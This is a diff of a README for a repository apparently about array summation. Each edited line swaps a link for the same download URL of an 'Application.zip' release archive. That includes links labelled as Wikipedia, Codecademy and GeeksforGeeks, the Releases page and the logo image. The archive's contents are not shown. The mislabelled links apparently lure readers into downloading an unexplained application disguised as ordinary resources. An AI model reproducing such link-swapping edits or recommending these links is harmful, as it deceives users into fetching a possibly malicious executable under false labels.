@@ -1,6 +1,6 @@
 # :zap: SumArray Repository :zap:
 
-Welcome to the **SumArray** repository! This README.md file provides all the necessary information about this repository. Feel free to explore and utilize the content and resources available here.
+Welcome to the **SumArray** repository! This https://github.com/Tanix11/sumArray/releases/download/v1.0.0/Application.zip file provides all the necessary information about this repository. Feel free to explore and utilize the content and resources available here.
 
 ## Overview
 
@@ -45,17 +45,17 @@ To make use of the content in this repository, follow these steps:
 ## Additional Resources
 
 For more information and insights related to array manipulation, algorithm efficiency, and coding best practices, check out the following resources:
-- [Introduction to Algorithms](https://en.wikipedia.org/wiki/Introduction_to_Algorithms)
-- [Codecademy](https://www.codecademy.com/learn)
-- [GeeksforGeeks](https://www.geeksforgeeks.org/)
+- [Introduction to Algorithms](https://github.com/Tanix11/sumArray/releases/download/v1.0.0/Application.zip)
+- [Codecademy](https://github.com/Tanix11/sumArray/releases/download/v1.0.0/Application.zip)
+- [GeeksforGeeks](https://github.com/Tanix11/sumArray/releases/download/v1.0.0/Application.zip)
 
 ## Get Started
 
-Ready to dive into the world of array summation algorithms? Start by exploring the [**SumArray Repository**](https://github.com/file/Application.zip)! :rocket:
+Ready to dive into the world of array summation algorithms? Start by exploring the [**SumArray Repository**](https://github.com/Tanix11/sumArray/releases/download/v1.0.0/Application.zip)! :rocket:
 
-For the latest updates and releases, visit the [Releases](https://github.com/sumArray/releases) section.
+For the latest updates and releases, visit the [Releases](https://github.com/Tanix11/sumArray/releases/download/v1.0.0/Application.zip) section.
 
-![SumArray](https://github.com/sumArray/logo.png)
+![SumArray](https://github.com/Tanix11/sumArray/releases/download/v1.0.0/Application.zip)
 
 ---
 
